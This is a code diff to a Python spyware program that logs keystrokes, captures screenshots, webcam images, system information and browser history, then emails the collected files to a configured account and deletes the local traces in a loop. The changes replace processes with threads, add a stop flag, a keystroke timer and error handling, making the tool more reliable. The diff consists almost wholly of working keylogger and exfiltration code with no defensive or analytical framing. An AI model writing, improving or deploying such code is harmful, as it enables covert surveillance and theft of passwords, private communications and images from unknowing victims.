@@ -12,13 +12,23 @@ import os
 import re
 import smtplib
 import time
+import cryptography.fernet
+import email.mime.base
+import email.mime.multipart
+import email.mime.text
+import pynput.keyboard
+import cryptography
+import email
+import pynput
+import PIL
+import threading
 from cryptography.fernet import Fernet
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from multiprocessing import Process
 from pynput.keyboard import Listener
 from PIL import ImageGrab
+from threading import Thread, Timer
 
 
 def decrypt(message):
@@ -26,6 +36,7 @@ def decrypt(message):
 
 
 class Logger:
+    RUNNING = False
 
     def __init__(self, time_limit=300, time_interval=5, file_path='C:\\Users\\Public\\Logs\\'):
         print("Initiating a logger ...")
@@ -36,10 +47,10 @@ class Logger:
         self.screenshots_path = self.file_path + 'screenshots\\'
         self.text_path = self.file_path + 'text\\'
         self.webcam_path = self.file_path + 'webcam\\'
-        self.logging_keys_process = Process(target=self.log_keys)
-        self.logging_screen_process = Process(target=self.log_screen)
-        self.logging_webcam_process = Process(target=self.log_webcam)
-        self.logging_browser_process = Process(target=self.log_browser_history)
+        self.logging_keys_process = Thread(target=self.log_keys)
+        self.logging_screen_process = Thread(target=self.log_screen)
+        self.logging_webcam_process = Thread(target=self.log_webcam)
+        self.logging_browser_process = Thread(target=self.log_browser_history)
 
     def gather_system_info(self):
         print("Gathering system information ...")
@@ -70,6 +81,7 @@ class Logger:
         logging.info(str(word))
 
     def launch(self):
+        Logger.RUNNING = True
         self.create_paths()
         self.gather_system_info()
         print(f"Launching loggers ...")
@@ -94,6 +106,7 @@ class Logger:
     def log_keys(self):
         print("Listening to key strokes ...")
         with Listener(on_press=lambda key: self.log(word=key)) as listening:
+            Timer(self.time_limit, listening.stop).start()
             listening.join()
 
     def log_screen(self):
@@ -101,19 +114,25 @@ class Logger:
             print("Taking a screenshot ...")
             pic = ImageGrab.grab()
             pic.save(self.screenshots_path + f'screenshot_{number}_{round(time.time())}.png')
+            if not Logger.RUNNING: break
             time.sleep(self.time_interval)
 
     def log_webcam(self):
-        webcam = cv2.VideoCapture(0)
-        for number in range(self.time_limit):
-            print("Taking a picture ...")
-            _, picture = webcam.read()
-            file = (self.webcam_path + f'webcam_{number}_{round(time.time())}.jpg')
-            cv2.imwrite(file, picture)
-            time.sleep(self.time_interval)
+        try:
+            webcam = cv2.VideoCapture(0)
+            for number in range(self.time_limit):
+                print("Taking a picture ...")
+                _, picture = webcam.read()
+                file = (self.webcam_path + f'webcam_{number}_{round(time.time())}.jpg')
+                cv2.imwrite(file, picture)
+                if not Logger.RUNNING: break
+                time.sleep(self.time_interval)
 
-        webcam.release()
-        cv2.destroyAllWindows()
+            webcam.release()
+            cv2.destroyAllWindows()
+        except:
+            print("Failed webcam ...")
+            Logger.RUNNING = False
 
     def log_browser_history(self):
         print("Gathering browser history ...")
@@ -130,17 +149,19 @@ class Logger:
 
     def end(self):
         print(f"Terminating loggers ...")
-        self.logging_keys_process.terminate()
-        self.logging_screen_process.terminate()
-        self.logging_webcam_process.terminate()
-        self.logging_browser_process.terminate()
+        Logger.RUNNING = False
 
     def clean_up(self):
         print("Removing the log folder ...")
-        try:
-            shutil.rmtree(self.file_path)
-        except OSError:
-            print("Folder not found!")
+        for filename in os.listdir(self.file_path):
+            file_path = os.path.join(self.file_path, filename)
+            try:
+                if os.path.isfile(file_path) or os.path.islink(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path):
+                    shutil.rmtree(file_path)
+            except Exception as e:
+                print('Failed to delete %s. Reason: %s' % (file_path, e))
 
 
 class Email:
@@ -221,16 +242,20 @@ def main(time_limit=3600, time_interval=60, file_path="C:\\Users\\Public\\"):
 
     try:
         for _ in range(time_limit):
-            logger = Logger(*SETTINGS)
-            logger.launch()
-            email = Email(*EMAIL_INFORMATION)
-            email.attach_files(logger.file_path)
-            email.login()
-            email.send(email.message)
-            email.end()
-            logger.clean_up()
-            del logger, email
+            try:
+                logger = Logger(*SETTINGS)
+                logger.launch()
+                email = Email(*EMAIL_INFORMATION)
+                email.attach_files(logger.file_path)
+                email.login()
+                email.send(email.message)
+                email.end()
+                logger.clean_up()
+                del logger, email
+            except:
+                sys.exit()
             time.sleep(time_interval)
+            print("Stopping with success! ...")
 
     except KeyboardInterrupt:
         print('Program exiting ...')
